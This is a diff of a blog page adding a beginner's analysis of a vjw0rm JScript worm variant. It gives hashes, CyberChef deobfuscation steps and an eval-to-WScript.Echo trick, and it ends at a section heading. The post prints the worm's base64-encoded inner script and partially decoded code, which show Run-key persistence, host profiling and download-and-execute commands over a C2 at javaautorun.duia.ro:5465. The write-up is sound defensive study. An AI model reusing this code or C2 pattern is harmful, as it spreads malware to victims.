@@ -10,14 +10,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title> &middot; Malware Analysis: Or How I Learned To Love Frustration</title>
-  <meta name="title" content=" &middot; Malware Analysis: Or How I Learned To Love Frustration" />
+  <title>Starting Small: Analysis of recent vjw0rm variant &middot; Malware Analysis: Or How I Learned To Love Frustration</title>
+  <meta name="title" content="Starting Small: Analysis of recent vjw0rm variant &middot; Malware Analysis: Or How I Learned To Love Frustration" />
   
   
   
   
   
-  <link rel="canonical" href="https://polaryse.github.io/posts/content/posts/vjworm/wscript_output.png/" />
+  <link rel="canonical" href="https://polaryse.github.io/posts/vjw0rm/" />
   
   
   
@@ -66,17 +66,18 @@
   
   
   
-  <meta property="og:title" content="" />
-<meta property="og:description" content="" />
+  <meta property="og:title" content="Starting Small: Analysis of recent vjw0rm variant" />
+<meta property="og:description" content="Analysis of a recent variant of vjw0rm. I walk through my approach to analysing the sample, the challenges I faced in completing the task, resources I leveraged to overcome these and finally the lessons I learned along the way." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://polaryse.github.io/posts/content/posts/vjworm/wscript_output.png/" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://polaryse.github.io/posts/vjw0rm/" /><meta property="og:image" content="https://polaryse.github.io/posts/vjw0rm/featured.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-11-20T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-11-20T00:00:00+00:00" /><meta property="og:site_name" content="Malware Analysis: Or How I Learned To Love Frustration" />
 
-<meta property="og:site_name" content="Malware Analysis: Or How I Learned To Love Frustration" />
 
-
-  <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content=""/>
-<meta name="twitter:description" content=""/>
+  <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://polaryse.github.io/posts/vjw0rm/featured.png"/>
+<meta name="twitter:title" content="Starting Small: Analysis of recent vjw0rm variant"/>
+<meta name="twitter:description" content="Analysis of a recent variant of vjw0rm. I walk through my approach to analysing the sample, the challenges I faced in completing the task, resources I leveraged to overcome these and finally the lessons I learned along the way."/>
 
   
   <script type="application/ld+json">
@@ -84,26 +85,26 @@
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Posts",
-    "name": "",
-    "headline": "",
+    "name": "Starting Small: Analysis of recent vjw0rm variant",
+    "headline": "Starting Small: Analysis of recent vjw0rm variant",
     
-    
+    "abstract": "Analysis of a recent variant of vjw0rm. I walk through my approach to analysing the sample, the challenges I faced in completing the task, resources I leveraged to overcome these and finally the lessons I learned along the way.",
     "inLanguage": "en-us",
-    "url" : "https:\/\/polaryse.github.io\/posts\/content\/posts\/vjworm\/wscript_output.png\/",
+    "url" : "https:\/\/polaryse.github.io\/posts\/vjw0rm\/",
     "author" : {
       "@type": "Person",
       "name": "polaryse"
     },
+    "copyrightYear": "2022",
+    "dateCreated": "2022-11-20T00:00:00\u002b00:00",
+    "datePublished": "2022-11-20T00:00:00\u002b00:00",
     
-    
-    
-    
-    
+    "dateModified": "2022-11-20T00:00:00\u002b00:00",
     
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "0"
+    "wordCount": "2356"
   }]
   </script>
 
@@ -408,6 +409,8 @@
   
   
   
+        <div class="w-full h-36 md:h-56 lg:h-72 single_hero_basic nozoom" style="background-image:url(/posts/vjw0rm/featured_hu1e084923b660c0bd2b10e0b6ab092420_635508_1200x0_resize_box_3.png);"></div>
+    
   <header id="single_header" class="mt-5 max-w-prose">
     
     <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
@@ -438,8 +441,8 @@
   <li class="inline hidden">
     <a
       class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
-      href="/posts/content/posts/vjworm/wscript_output.png/"
-      >posts</a
+      href="/posts/vjw0rm/"
+      >Starting Small: Analysis of recent vjw0rm variant</a
     ><span class="px-1 text-primary-500">/</span>
   </li>
 
@@ -448,7 +451,7 @@
 
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      
+      Starting Small: Analysis of recent vjw0rm variant
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -486,10 +489,14 @@
 
 
 
+
+
+
+
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="0001-01-01 00:00:00 &#43;0000 UTC">January 1, 1</time><span class="px-2 text-primary-500">&middot;</span>
+  <time datetime="2022-11-20 00:00:00 &#43;0000 UTC">November 20, 2022</time><span class="px-2 text-primary-500">&middot;</span><span>2356 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">12 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
   
@@ -499,7 +506,7 @@
 
 <span class="mb-[2px]">
   <a
-    href="#/posts/content/posts/vjworm/wscript_output.png.md"
+    href="#/posts/vjw0rm/index.md"
     class="text-lg hover:text-primary-500"
     rel="noopener noreferrer"
     target="_blank"
@@ -529,10 +536,512 @@
     </div>
   </header>
   <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
-    
+     
+    <div class="order-first sm:max-w-prose lg:ml-auto px-0 lg:order-last lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky  lg:top-10 ">
+        <details open class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600"
+  >
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#hash-values">Hash Values</a></li>
+      </ul>
+    </li>
+    <li><a href="#approach">Approach</a>
+      <ul>
+        <li><a href="#analysis-take-two">Analysis Take Two</a></li>
+        <li><a href="#interjection-the-folly-of-an-analyst">Interjection: The folly of an analyst</a></li>
+        <li><a href="#the-analysis-deepens">The Analysis&hellip; deepens?</a></li>
+        <li><a href="#host-indicators">Host Indicators</a></li>
+        <li><a href="#network-indicators">Network Indicators</a></li>
+      </ul>
+    </li>
+    <li><a href="#lessons-learned-in-analysis">Lessons Learned in Analysis</a></li>
+    <li><a href="#resources">Resources</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600"
+  >
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#hash-values">Hash Values</a></li>
+      </ul>
+    </li>
+    <li><a href="#approach">Approach</a>
+      <ul>
+        <li><a href="#analysis-take-two">Analysis Take Two</a></li>
+        <li><a href="#interjection-the-folly-of-an-analyst">Interjection: The folly of an analyst</a></li>
+        <li><a href="#the-analysis-deepens">The Analysis&hellip; deepens?</a></li>
+        <li><a href="#host-indicators">Host Indicators</a></li>
+        <li><a href="#network-indicators">Network Indicators</a></li>
+      </ul>
+    </li>
+    <li><a href="#lessons-learned-in-analysis">Lessons Learned in Analysis</a></li>
+    <li><a href="#resources">Resources</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+      </div>
+      </div>
+      
       <div class="min-w-0 min-h-0 max-w-prose">
         
-        
+        <div id="summary" class="anchor">Summary></div>
+<h3 class="relative group">Summary 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#summary" aria-label="Anchor">#</a></span>        
+    
+</h3><p>I want to caveat your reading of this post with this; this is all about dipping the old cyber toe into reversing. I will make mistakes, I will document said mistakes throughout and even when I have published this blog, there will undoubtedly be things that more experienced folk will pick up that I might have misinterpreted or plainly gotten wrong.</p>
+<p>Regardless, I hope this serves as a nie write up for other folks that are interested in the field as well as giving a bit back to the community. So without further ado, lettuce commence.</p>
+<div id="hash-values" class="anchor">Hash Values></div>
+<h3 class="relative group">Hash Values 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#hash-values" aria-label="Anchor">#</a></span>        
+    
+</h3><p>This sample was sourced from ANY.RUN. There is a level of obfuscation associated with this malware variant which is an interesting starting point for analysis.</p>
+<table>
+<thead>
+<tr>
+<th><strong>Hash</strong></th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>MD5</strong>:</td>
+<td>ee3851d1ae3dca617ea7ca4331e2bc8f</td>
+</tr>
+<tr>
+<td><strong>SHA1</strong>:</td>
+<td>8759637e8acb0406d0a485ae784f28205cc4dccf</td>
+</tr>
+<tr>
+<td><strong>SHA256</strong>:</td>
+<td>f0aa755fc9a44a0406ee649d6ae6f05b18bbe0b3be072c96e9ecb6269ab25636</td>
+</tr>
+</tbody>
+</table>
+<div id="approach" class="anchor">Approach></div>
+<h2 class="relative group">Approach 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#approach" aria-label="Anchor">#</a></span>        
+    
+</h2><p>I started this task with your basic static protocols. I had a bit of a squiz at the thing in Notepad++. Initially it was a visual nightmare, a bunch of randomly named functions, with some wild, random blobs of data.  I ended up installing a nice JS plugin called &ldquo;JSTool&rdquo; to help visualise and format this code so that my eyeballs didn&rsquo;t bleed from the chonk of the thing.</p>
+<p><em>Although I later learned that Cyberchef has the same function, if not actually better than this plugin, so I actually completed this step again using the output from that tool.</em></p>
+<p>
+
+
+
+  
+  
+    
+  
+  
+    <figure>
+      <img
+        class="my-0 rounded-md"
+        srcset="
+          /posts/vjw0rm/obfuscated_hu89084ad317175d082671a246c580bf5d_134581_330x0_resize_box_3.png 330w,
+          /posts/vjw0rm/obfuscated_hu89084ad317175d082671a246c580bf5d_134581_660x0_resize_box_3.png 660w,
+          /posts/vjw0rm/obfuscated_hu89084ad317175d082671a246c580bf5d_134581_1024x0_resize_box_3.png 1024w,
+          /posts/vjw0rm/obfuscated_hu89084ad317175d082671a246c580bf5d_134581_1320x0_resize_box_3.png 2x"
+        src="/posts/vjw0rm/obfuscated_hu89084ad317175d082671a246c580bf5d_134581_660x0_resize_box_3.png"
+        alt="obfuscated"
+      />
+      
+    </figure>
+  
+
+
+<em>Figure 1: Look at that delightful formatting from Cyberchef.io</em></p>
+<p>In my initial scan, I looked for key identifiers that could help me understand <em>what exactly</em> this script was doing. Immediately, nothing really makes sense, so it is easy to say that this is obfuscated.</p>
+<p>The function that immediately warranted further investigation was <code>_$af13899809</code> with a variable that contained a chunk of intriguing code.</p>
+<pre tabindex="0"><code>Ly8gQ29kZWQgYnkgdl9CMDEgfCBTbGllbWVyZXogLT4gVHdpdHRlci&lt;_6IFNsaWVtZXJleg0KDQp2YXIgai&lt;_9IFsiV1NjcmlwdC5TaGVsbCIsIlNjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0IiwiU2hlbGwuQXBwbGljYXRpb24iLCJNaWNyb3NvZnQuWE1MSFRUUCJdOw0KdmFyIGcgPSBbIkhLQ1UiLCJIS0xNIiwiSEtDVVxcdmp3MHJtIiwiXFxTb2Z0d2FyZVxcTWljcm9zb2Z0XFxXaW5kb3dzXFxDdXJyZW50VmVyc2lvblxcUnVuXFwiLCJIS0xNXFxTT0ZUV0FSRVxcQ2xhc3Nlc1xcIiwiUkVHX1NaIiwiXFxkZWZhdWx0aWNvblxcIl07DQp2YXIgeS&lt;_9IFsid2lubWdtdHM6Iiwid2luMzJfbG9naWNhbGRpc2siLCJXaW4zMl9PcGVyYXRpbmdTeXN0ZW0iLCdBbnRpVmlydXNQcm9kdWN0J107DQoNCnZhciBzaC&lt;_9IENyKD&lt;_pOw0KdmFyIGZzID0gQ3IoMSk7DQp2YXIgc3BsID0gInxWfCI7DQp2YXIgQ2ggPS&lt;_iXFwiOw0KdmFyIFZOID0gIjkvMjEiICsgIl8iICsgT2IoNik7DQp2YXIgZnUgPSBXU2NyaXB0LlNjcmlwdEZ1bGxOYW1lOw0KdmFyIHduID0gV1NjcmlwdC5TY3JpcHROYW1lOw0KdmFyIFU7DQp0cnkgew0KVS&lt;_9IHNoLlJlZ1JlYWQoZ1syXSk7DQp9IGNhdGNoKGVycikgew0KdmFyIHN2ID0gZnUuc3BsaXQoIlxcIik7DQppZi&lt;_oIjpcXCIgKyBzdlsxXS&lt;_9PS&lt;_iOlxcIi&lt;_rIHduKSB7DQpVID0gIlRSVUUiOw0Kc2guUmVnV3JpdGUoZ1syXSxVLGdbNV0pOw0KfSBlbHNlIHsNClUgPS&lt;_iRkFMU0UiOw0Kc2guUmVnV3JpdGUoZ1syXSxVLGdbNV0pOw0KfQ0KfQ0KTnMoKTsNCmRvIHsNCnRyeSB7DQp2YXIgUC&lt;_9IFB0KCdWcmUnLCcnKTsNCl&lt;_gPSBQLnNwbGl0KHNwbCk7DQoNCmlmIChQWzBdID09PS&lt;_iQ2wiKSB7DQpXU2NyaXB0LlF1aXQoMSk7DQp9DQoNCmlmIChQWzBdID09PS&lt;_iU2MiKSB7DQp2YXIgczIgPSBFeCgidGVtcCIpICsgIlxcIi&lt;_rIFBbMl07DQp2YXIgZmkgPSBmcy5DcmVhdGVUZXh0RmlsZShzMix0cnVlKTsNCmZpLldyaXRlKFBbMV0pOw0KZmkuQ2xvc2UoKTsNCnNoLnJ1bihzMik7DQp9DQoNCmlmIChQWzBdID09PS&lt;_iRXgiKSB7DQpldmFsKFBbMV0pOw0KfQ0KDQppZi&lt;_oUFswXS&lt;_9PT0gIlJuIikgew0KdmFyIHJpID0gZnMuT3BlblRleHRGaWxlKGZ1LDEpOw0KdmFyIGZyID0gcmkuUmVhZEFsbCgpOw0KcmkuQ2xvc2UoKTsNClZOID0gVk4uc3BsaXQoIl8iKTsNCmZyID0gZnIucmVwbGFjZShWTlswXSxQWzFdKTsNCnZhciB3aS&lt;_9IGZzLk9wZW5UZXh0RmlsZShmdSwyLGZhbHNlKTsNCndpLldyaXRlKGZyKTsNCndpLkNsb3NlKCk7DQpzaC5ydW4oIndzY3JpcHQuZXhlIC8vQiBcIiIgKyBmdS&lt;_rICJcIiIpOw0KV1NjcmlwdC5RdWl0KDEpOw0KfQ0KDQppZi&lt;_oUFswXS&lt;_9PT0gIlVwIikgew0KdmFyIHMyID0gRXgoInRlbX&lt;_iKS&lt;_rICJcXCIgKyBQWzJdOw0KdmFyIGN0Zi&lt;_9IGZzLkNyZWF0ZVRleHRGaWxlKHMyLHRydWUpOw0KdmFyIGd1ID0gUFsxXTsNCmd1ID0gZ3UucmVwbGFjZSgifFV8IiwifFZ8Iik7DQpjdGYuV3JpdGUoZ3UpOw0KY3RmLkNsb3NlKCk7DQpzaC5ydW4oIndzY3JpcHQuZXhlIC8vQiBcIiIgKyBzMi&lt;_rICJcIiIsNik7DQpXU2NyaXB0LlF1aXQoMSk7DQp9DQoNCmlmIChQWzBdID09PS&lt;_iVW4iKSB7DQp2YXIgczIgPSBQWzFdOw0KdmFyIHZkci&lt;_9IGZ1Ow0KdmFyIHJlZ2kgPS&lt;_iTm90aGluZyEiOw0KczIgPSBzMi5yZXBsYWNlKCIlZiIsZnUpLnJlcGxhY2UoIiVuIix3bikucmVwbGFjZSgiJXNmZHIiLHZkcikucmVwbGFjZSgiJVJnTmUlIixyZWdpKTsNCmV2YWwoczIpOw0KV1NjcmlwdC5RdWl0KDEpOw0KfQ0KDQppZi&lt;_oUFswXS&lt;_9PT0gIlJGIikgew0KdmFyIHMyID0gRXgoInRlbX&lt;_iKS&lt;_rICJcXCIgKyBQWzJdOw0KdmFyIGZpID0gZnMuQ3JlYXRlVGV4dEZpbGUoczIsdHJ1ZSk7DQpmaS5Xcml0ZShQWzFdKTsNCmZpLkNsb3NlKCk7DQpzaC5ydW4oczIpOw0KfQ0KfSBjYXRjaChlcnIpIHsNCn0NCldTY3JpcHQuU2xlZX&lt;_oNz&lt;_wMCk7DQoNCn0gd2hpbGUgKHRydWUpIDsNCg0KDQpmdW5jdGlvbiBFeChTKSB7DQpyZXR1cm4gc2guRXhwYW5kRW52aXJvbm1lbnRTdHJpbmdzKCIlIi&lt;_rIFMgKy&lt;_iJSIpOw0KfQ0KZnVuY3Rpb24gUHQoQyxBKSB7DQp2YXIgWC&lt;_9IENyKDMpOw0KWC5vcGVuKCdQT1NUJywnaHR0cDovL2phdmFhdXRvcnVuLmR1aWEucm86NTQ2NS8nICsgQywgZmFsc2UpOw0KWC5TZXRSZXF1ZXN0SGVhZGVyKCJVc2VyLUFnZW50OiIsbmYoKSk7DQpYLnNlbmQoQSk7DQpyZXR1cm4gWC5yZXNwb25zZXRleHQ7DQp9DQoNCg0KZnVuY3Rpb24gbmYoKSB7DQp2YXIgcyxOVCxpOw0KaWYgKGZzLmZpbGVleGlzdHMoRXgoIldpbmRpciIpICsgIlxcTWljcm9zb2Z0Lk5FVFxcRnJhbWV3b3JrXFx2Mi4wLjUwNzI3XFx2YmMuZXhlIikpIHsNCk5UID0iWUVTIjsNCn0gZWxzZSB7DQpOVC&lt;_9ICJOTyI7DQp9DQpzID0gVk4gKyBDaC&lt;_rIEV4KCJDT01QVVRFUk5BTUUiKS&lt;_rIENoICsgRXgoIlVTRVJOQU1FIikgKyBDaC&lt;_rIE9iKDIpICsgQ2ggKyBPYig0KS&lt;_rIENoICsgQ2ggKyBOVC&lt;_rIENoICsgVS&lt;_rIENoOw0KcmV0dXJuIHM7DQp9DQoNCmZ1bmN0aW9uIENyKE4pIHsNCglyZXR1cm4gbmV3IEFjdGl2ZVhPYmplY3QoaltOXSk7DQp9DQoNCmZ1bmN0aW9uIE9iKE4pIHsNCnZhciBzOw0KaWYgKE4gPT0gMikgew0Kcy&lt;_9IEdldE9iamVjdCh5WzBdKS5JbnN0YW5jZXNPZih5WzJdKTsNCnZhciBlbi&lt;_9IG5ldyBFbnVtZXJhdG9yKHMpOw0KZm9yICg7ICFlbi5hdEVuZCgpO2VuLm1vdmVOZXh0KCkpIHsNCnZhciBpdC&lt;_9IGVuLml0ZW0oKTsNCnJldHVybiBpdC5DYXB0aW9uOw0KYnJlYWs7DQp9DQp9DQppZi&lt;_oTi&lt;_9PS&lt;_0KSB7DQp2YXIgd21nID0gIndpbm1nbXRzOlxcXFxsb2NhbGhvc3RcXHJvb3RcXHNlY3VyaXR5Y2VudGVyIjsNCnMgPSBHZXRPYmplY3Qod21nKS5JbnN0YW5jZXNPZih5WzNdKTsNCnZhciBlbi&lt;_9IG5ldyBFbnVtZXJhdG9yKHMpOw0KZm9yICg7ICFlbi5hdEVuZCgpO2VuLm1vdmVOZXh0KCkpIHsNCnZhciBpdC&lt;_9IGVuLml0ZW0oKTsNCnZhciBzdHIgPSBpdC5EaXNwbGF5TmFtZTsNCn0NCmlmIChzdHIgIT09ICcnKSB7DQp3bWcgPSB3bWcgKy&lt;_iMiI7DQpzID0gR2V0T2JqZWN0KHdtZykuSW5zdGFuY2VzT2YoeVszXSk7DQplbi&lt;_9IG5ldyBFbnVtZXJhdG9yKHMpOw0KZm9yICg7ICFlbi5hdEVuZCgpO2VuLm1vdmVOZXh0KCkpIHsNCml0ID0gZW4uaXRlbSgpOw0KcmV0dXJuIGl0LkRpc3BsYXlOYW1lOw0KfQ0KfSBlbHNlIHsNCnJldHVybiBpdC5EaXNwbGF5TmFtZTsNCn0NCn0NCmlmIChOPT02KSB7DQpzID0gR2V0T2JqZWN0KHlbMF0pLkluc3RhbmNlc09mKHlbMV0pOw0KdmFyIGVuID0gbmV3IEVudW1lcmF0b3Iocyk7DQpmb3IgKDsgIWVuLmF0RW5kKCk7ZW4ubW92ZU5leHQoKSkgew0KdmFyIGl0ID0gZW4uaXRlbSgpOw0KcmV0dXJuIGl0LnZvbHVtZXNlcmlhbG51bWJlcjsNCmJyZWFrOw0KfQ0KfQ0KfQ0KDQpmdW5jdGlvbiBOcygpIHsNCgkNCgkNCgkNCgl0cnkgew0KCQl2YXIgYX&lt;_gPSBDcigyKTsNCgkJZnMuQ29weUZpbGUoZnUsIGFwLk5hbWVTcGFjZSg3KS5TZWxmLlBhdGggKy&lt;_iXFwiICsgd24sdHJ1ZSk7DQoJfSBjYXRjaChlcnIpIHsNCgl9DQp9DQoNCg0K
+</code></pre><p><em>Figure 2: Encoded chunk of text</em></p>
+<p>I do believe you just might be base64 encoded fren.</p>
+<p>Lets test that theory.</p>
+<p>I threw the blob into Cyberchef.io to hopefully reveal the sage wisdom of the malware. Alas, it still looked incredibly borked in the output. Some components of the code were readable, but there were distinct blobs that again, simply didnt look right.</p>
+<pre tabindex="0"><code>// Coded by v_B01 | Sliemerez -&gt; Twitter...Û.Y[Y\.^.B.B..\...Ò.²%u67&amp;..Bå6.VÆÂ&#34;Â%67&amp;..F.æräf.ÆU7.7FVÔö&amp;¦V7B&#34;Â%6.VÆÂä...Æ.6.F.öâ&#34;Â$Ö.7&amp;÷6ögBå.ÔÄ.EE.%Ó°Ð§f.&#34;.r.Ò.²$.´5R&#34;Â$.´ÄÒ&#34;Â$.´5UÅÇf§s.&amp;Ò&#34;Â%ÅÅ6ögGv.&amp;UÅÄÖ.7&amp;÷6ögEÅÅv.æF÷w5ÅÄ7W&#39;&amp;VçEfW&#39;6.öåÅÅ&#39;VåÅÂ&#34;Â$.´ÄÕÅÅ4ôeEt.$UÅÄ6Æ.76W5ÅÂ&#34;Â%$Tuõ5¢&#34;Â%ÅÆFVf.VÇF.6öåÅÂ%Ó°Ð§f.&#34;..ô.l.Ý¥¹µ.µÑÌè.°.Ý¥¸ÌÉ}±½.¥..±.¥Í¬.°.]¥¸ÌÉ}=Á.É.Ñ¥¹.MåÍÑ.´.°..¹Ñ¥Y¥ÉÕÍAÉ½.Õ.Ð.tì4(4)Ù.È.Í ½ Cr(:NÃB..\...È.H.Ü..JNÃB..\..Ü...H......ÃB..\..Ú..J%ÅÂ#°Ð§f.&#34;.dâ.Ò.#.ó#.&#34;.².%ò&#34;.².ö&#34;.b.°Ð§f.&#34;.gR.Ò.u67&amp;..Bå67&amp;..DgVÆÄæ.ÖS°Ð§f.&#34;.vâ.Ò.u67&amp;..Bå67&amp;..Dæ.ÖS°Ð§f.&#34;.S°Ð§G&#39;..°Ð¥Rô.Í ¹I..I...¡.lÉt¤ì4)ô...Ñ. ¡.ÉÈ¤.ì4)Ù.È.ÍØ.ô..Ô¹ÍÁ±¥Ð .qp.¤ì4)¥.¨&#34;:\\&#34; + sv[1]/OJ#¥ÅÂ&#34;¬.Ý¸¤.ì4)T.ô..QIU..ì4)Í ¹I..]É¥Ñ.¡.lÉt±T±.lÕt¤ì4)ô..±Í..ì4)T.ô¢FALSE&#34;;
+sh.RegWrite(g[2],U,g[5]);
+}
+}
+Ns();
+do {
+try {
+var P/H..
+	Õ..IË	ÉÊNÃB..Ò..ç7.Æ.B.7.Â.°Ð Ð¦.b...³.Ò.ÓÓÒ.
+°.¤.ì4)]M.É¥ÁÐ¹EÕ¥Ð Ä¤ì4)ô4(4)¥..¡AlÁt.ôôô¢Sc&#34;) {
+var s2 = Ex(&#34;temp&#34;) + &#34;\\&#34;*È..Ì.NÃB..\...H.H..Ë.Ü.X].U.^...[.J.Ì....YJNÃB..K.Ü.].J..ÌWJNÃB..K.Û.ÜÙJ
+NÃB.Ú...[..Ì.NÃB.CB.B.Y.
+..Ì.H.OOJ$W.&#34;..°Ð¦Wf.Â..³.Ò.°Ð§ÐÐ Ð¦.b¡AlÁt½== &#34;Rn&#34;) {
+var ri = fs.OpenTextFile(fu,1);
+var fr = ri.ReadAll();
+ri.Close();
+VN = VN.split(&#34;_&#34;);
+fr = fr.replace(VN[0],P[1]);
+var wi/H..Ë.Ü.[..^...[.J..K....[.ÙJNÃB.ÚK.Ü.].J...NÃB.ÚK.Û.ÜÙJ
+NÃB.Ú...[...ÜØÜ.\...^.H.ËÐ.....
+È..J².%Â&#34;&#34;.°Ð¥u67&amp;..Bå.V.B...°Ð§ÐÐ Ð¦.b¡AlÁt½== &#34;Up&#34;) {
+var s2 = Ex(&#34;temx.J².%ÅÂ&#34;.²..³%Ó°Ð§f.&#34;.7Fbô..Ì¹
+É..Ñ.Q.áÑ.¥±.¡ÌÈ±ÑÉÕ.¤ì4)Ù.È..Ô.ô.AlÅtì4).Ô.ô..Ô¹É.Á±... .ñUð.°.ñYð.¤ì4).Ñ.¹]É¥Ñ.¡.Ô¤ì4).Ñ.¹
+±½Í. ¤ì4)Í ¹ÉÕ¸ .ÝÍ.É¥ÁÐ¹.á..¼½..p...¬.ÌÈ« &#34;\&#34;&#34;,6);
+WScript.Quit(1);
+}
+</code></pre><p><em>Figure 3: Partially decoded chunk of the script</em></p>
+<p>Initial screening of the readable information and we have gleaned some facts at least:</p>
+<ul>
+<li>The code has an author</li>
+<li>Reference to a domain name, potential C2 <code>http://javaautorun.duia.ro:5465</code> with a specific port for comms via POST request</li>
+<li>There is reference to a file on the operating system. <code>\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe</code></li>
+</ul>
+<p>At this point we have some interesting pieces of information and additionally, some solid evidence that points to our script being very naughty indeed.</p>
+<p>The next step was to figure out how to actually decode this information, so that everything is actually readable &ndash; as it should be. There <em>had</em> to be a key here.</p>
+<p><code>// Coded by v_B01 | Sliemerez -&gt; Twitter</code></p>
+<p>What is v_B01? and what is a Sliemerez?  how to we get it to tell us its secrets? It&rsquo;s time for some research.</p>
+<p>After a few hours of looking into samples that also included similar statements, I was at a bit of a loss. The frustration levels grew higher and I decided to walk away. On return, I took a different approach to the problem and focused instead on methodologies used by other malware analysts to look at similar malware written in JavaScript.</p>
+<div id="analysis-take-two" class="anchor">Analysis Take Two></div>
+<h3 class="relative group">Analysis Take Two 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#analysis-take-two" aria-label="Anchor">#</a></span>        
+    
+</h3><p>I returned to the script with renewed vigour, donned my glasses and ignored that giant chunk of text for the moment. The hot take I learned from my researching travels was to look out for <code>eval</code> statements, and <code>eval</code>s did I look for indeed!</p>
+<p>The original obfuscated sample contained one such statement at the end of the code.</p>
+<pre tabindex="0"><code>	xmlDOM[_2(254)] = _2(242), xmlDOM[_2(256)] = superString[_2(240)](/&lt;_/g, &#39;A&#39;);
+	comObject = WSH[_2(234)](_2(239));
+	if (!_$af1389800) {
+		_$af1389809();
+		_$af1389800 = 0;
+	}
+	;
+	comObject[_2(248)] = 1, comObject[_1(162)](), comObject[_2(244)](xmlDOM[_1(180)]), comObject[_2(237)] = 0, comObject[_8(458)] = 2, comObject[_2(247)] = _1(168), eval(comObject[_2(241)]());
+}());
+</code></pre><p><em>Figure 4: Eval statement in obfuscated nonsense</em></p>
+<p>Now, the comobjects and xmlDOM should have immediately given away the fact I shouldn&rsquo;t use console.log in this instance to attempt deobfuscation of this script, however, in my gusto I did and thoroughly bamboozled myself for the next few hours, wondering why, exactly the script now hung when I ran it with nodejs. I ended up once again taking a break and pondering my existence and lifes choices a little longer before I arrived at the next attempt.</p>
+<p>comObject, you say? Well lets give wscript a crack and replace that <code>eval</code> statement with <code>WScript.Echo</code> and see what we get.</p>
+<p>I changed the code and opened up powershell.</p>
+<pre tabindex="0"><code>	xmlDOM[_2(254)] = _2(242), xmlDOM[_2(256)] = superString[_2(240)](/&lt;_/g, &#39;A&#39;);
+	comObject = WSH[_2(234)](_2(239));
+	if (!_$af1389800) {
+		_$af1389809();
+		_$af1389800 = 0;
+	}
+	;
+	comObject[_2(248)] = 1, comObject[_1(162)](), comObject[_2(244)](xmlDOM[_1(180)]), comObject[_2(237)] = 0, comObject[_8(458)] = 2, comObject[_2(247)] = _1(168), WScript.Echo(comObject[_2(241)]());
+}());
+
+# changing context to powershell
+
+cscript.exe ./vjw0rm_2.js
+</code></pre><p><em>Figure 5: Wscript replacement and powershell execution command</em></p>
+<div id="interjection-the-folly-of-an-analyst" class="anchor">Interjection: The folly of an analyst></div>
+<h3 class="relative group">Interjection: The folly of an analyst 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#interjection-the-folly-of-an-analyst" aria-label="Anchor">#</a></span>        
